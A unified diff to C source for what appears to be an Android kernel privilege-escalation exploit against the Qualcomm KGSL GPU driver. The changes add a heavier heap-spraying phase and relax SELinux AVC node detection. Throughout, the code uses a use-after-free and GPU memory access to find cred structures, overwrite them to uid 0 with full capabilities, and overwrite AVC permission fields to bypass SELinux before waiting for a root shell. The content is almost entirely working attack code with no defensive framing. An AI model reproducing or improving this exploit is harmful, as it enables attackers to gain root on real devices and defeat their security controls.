@@ -170,8 +170,10 @@ static void *race_thread(void *arg) {
     return NULL;
 }
 
-static void gen_avc_entries(void) {
-    for (int pid = 1; pid <= 500; pid++) {
+// 強力なAVCエントリ生成
+static void gen_avc_entries_heavy(void) {
+    // /proc を大量にスキャン
+    for (int pid = 1; pid <= 2000; pid++) {
         char path[64];
         snprintf(path, sizeof(path), "/proc/%d/status", pid);
         int fd = open(path, O_RDONLY);
@@ -184,7 +186,8 @@ static void gen_avc_entries(void) {
         fd = open(path, O_RDONLY);
         if (fd >= 0) close(fd);
     }
-    for (int i = 0; i < 1000; i++) {
+    // /sys/fs/selinux をスキャン
+    for (int i = 0; i < 200; i++) {
         char path[64];
         snprintf(path, sizeof(path), "/sys/fs/selinux/class/%d", i % 100);
         int fd = open(path, O_RDONLY);
@@ -291,8 +294,35 @@ int main(int argc, char **argv) {
     if (rf >= 0) { write(rf, "3", 1); close(rf); }
     usleep(10000);
 
-    // ===== Phase 5: Spawn task_struct spray with AVC generation =====
-    printf("[*] Phase 5: Spawning task_struct spray (%d children) + AVC generation\n", SPRAY_PIDS);
+    // ===== Phase 5: AVC生成用子プロセスを大量起動 (UAF解放後) =====
+    printf("[*] Phase 5: Spawning %d AVC generation children\n", AVC_CHILD_COUNT);
+    int avc_pipe[2];
+    if (pipe(avc_pipe) < 0) die("pipe");
+    fcntl(avc_pipe[0], F_SETFD, FD_CLOEXEC);
+    fcntl(avc_pipe[1], F_SETFD, FD_CLOEXEC);
+
+    for (int i = 0; i < AVC_CHILD_COUNT; i++) {
+        pid_t p = fork();
+        if (p == 0) {
+            close(avc_pipe[0]);
+            prctl(PR_SET_NAME, "AVCCHILD");
+            gen_avc_entries_heavy();
+            write(avc_pipe[1], "G", 1);
+            close(avc_pipe[1]);
+            _exit(0);
+        }
+    }
+    close(avc_pipe[1]);
+    // 全子プロセスの完了を待つ
+    for (int i = 0; i < AVC_CHILD_COUNT; i++) {
+        char c;
+        read(avc_pipe[0], &c, 1);
+    }
+    close(avc_pipe[0]);
+    printf("  All AVC children done\n");
+
+    // ===== Phase 6: task_struct spray (これでUAF領域にtask_structとAVCが混在) =====
+    printf("[*] Phase 6: Spawning task_struct spray (%d children)\n", SPRAY_PIDS);
     int notify_pipe[2];
     if (pipe(notify_pipe) < 0) die("pipe");
     fcntl(notify_pipe[0], F_SETFD, FD_CLOEXEC);
@@ -305,8 +335,7 @@ int main(int argc, char **argv) {
         if (p == 0) {
             close(notify_pipe[0]);
             prctl(PR_SET_NAME, "TASKUAF!!");
-            // Generate AVC entries to fill slab caches
-            gen_avc_entries();
+            // 少し待ってからrootチェック
             for (int j = 0; j < 1800; j++) {
                 usleep(200000);
                 if (getuid() == 0) {
@@ -326,8 +355,8 @@ int main(int argc, char **argv) {
     close(notify_pipe[1]);
     printf("  Spawned %d children\n", n_spray);
 
-    // ===== Phase 6: Scan for cred pages =====
-    printf("[*] Phase 6: GPU scan for cred pages (pattern 0x000007D0)\n");
+    // ===== Phase 7: cred pages scan =====
+    printf("[*] Phase 7: GPU scan for cred pages (pattern 0x000007D0)\n");
     unsigned int ctx_id = create_context(kgsl_fd);
     int ib_id = gpuobj_alloc(kgsl_fd, 0x10000, alloc_flags);
     void *ib_m = gpuobj_mmap(kgsl_fd, 0x10000, ib_id);
@@ -382,15 +411,15 @@ int main(int argc, char **argv) {
             n_cred++;
         }
     }
-    printf("\n[*] Phase 6 complete: found %d cred pages\n", n_cred);
+    printf("\n[*] Phase 7 complete: found %d cred pages\n", n_cred);
 
     if (n_cred == 0) {
         printf("[-] No cred pages found, aborting\n");
         return 1;
     }
 
-    // ===== Phase 7: Overwrite cred =====
-    printf("[*] Phase 7: Overwrite cred fields (uid=0, caps=full)\n");
+    // ===== Phase 8: overwrite cred =====
+    printf("[*] Phase 8: Overwrite cred fields (uid=0, caps=full)\n");
     for (int p = 0; p < n_cred && p < 32; p++) {
         uint64_t cbase = cred_pages[p] + cred_offs[p];
         uint32_t *cmd = (uint32_t *)ib_m;
@@ -425,12 +454,14 @@ int main(int argc, char **argv) {
     flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
     printf("[+] Cred overwrite done\n");
 
-    // ===== Phase 8: AVC bypass =====
-    printf("[*] Phase 8: GPU scan for AVC cache pages in UAF area\n");
+    // ===== Phase 9: AVC scan and overwrite =====
+    printf("[*] Phase 9: GPU scan for AVC cache pages in UAF area\n");
     uint64_t avc_vas[256];
     int n_avc = 0;
-    for (uint64_t va = scan_start; va < end_va && n_avc < 256; va += 0x1000) {
-        if (((va - scan_start) & 0xFFFFF) == 0) printf(".");
+    // スキャン範囲を UAF_ADDR から開始 (0x1000 飛ばさない)
+    uint64_t avc_scan_start = UAF_ADDR;
+    for (uint64_t va = avc_scan_start; va < end_va && n_avc < 256; va += 0x1000) {
+        if (((va - avc_scan_start) & 0xFFFFF) == 0) printf(".");
         memset(ib_m, 0, 0x10000);
         memset(dst_m, 0, 0x1000);
         uint32_t *cmd = (uint32_t *)ib_m;
@@ -454,15 +485,15 @@ int main(int argc, char **argv) {
 
         uint32_t *d = (uint32_t *)dst_m;
         int ahits = 0;
+        // AVCノード検出条件を緩和: ssid, tsid, tclass が妥当ならOK (pprev_hi はチェックしない)
         for (int ofs = 0; ofs < 4032; ofs += 72) {
             int idx = ofs / 4;
             if (idx + 13 >= AVC_SCAN_DWORDS) break;
             uint32_t ssid = d[idx];
             uint32_t tsid = d[idx+1];
             uint32_t tclass = d[idx+2] & 0xFFFF;
-            uint32_t pprev_hi = d[idx+13];
             if (ssid > 0 && ssid < 10000 && tsid > 0 && tsid < 10000 &&
-                tclass > 0 && tclass < 1000 && (pprev_hi >> 16) == 0xFFFF) {
+                tclass > 0 && tclass < 1000) {
                 ahits++;
             }
         }
@@ -475,7 +506,7 @@ int main(int argc, char **argv) {
     printf("\n[*] Found %d AVC pages\n", n_avc);
 
     if (n_avc > 0) {
-        printf("[*] Phase 8b: Overwrite AVC allowed fields (0xFFFFFFFF)\n");
+        printf("[*] Phase 9b: Overwrite AVC allowed fields (0xFFFFFFFF)\n");
         for (int p = 0; p < n_avc; p++) {
             memset(ib_m, 0, 0x10000);
             uint32_t *cmd = (uint32_t *)ib_m;
@@ -541,7 +572,7 @@ int main(int argc, char **argv) {
         }
     }
 
-    printf("[*] Phase 9: Cache eviction\n");
+    printf("[*] Phase 10: Cache eviction\n");
     void *ev = mmap(0, 0x2000000, PROT_READ|PROT_WRITE,
         MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
     if (ev != MAP_FAILED) {
@@ -551,7 +582,7 @@ int main(int argc, char **argv) {
     }
     sleep(1);
 
-    printf("[*] Phase 10: Waiting for root shell...\n");
+    printf("[*] Phase 11: Waiting for root shell...\n");
     close(notify_pipe[1]);
     struct pollfd pfd = { .fd = notify_pipe[0], .events = POLLIN };
     pid_t winner = 0;
